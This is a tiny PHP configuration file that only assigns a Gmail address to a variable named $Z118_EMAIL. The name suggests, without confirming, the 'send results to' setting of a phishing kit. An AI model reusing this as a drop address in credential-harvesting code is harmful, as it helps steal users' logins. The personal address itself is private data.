<?php
$Z118_EMAIL = "r24x25@gmail.com";
?>
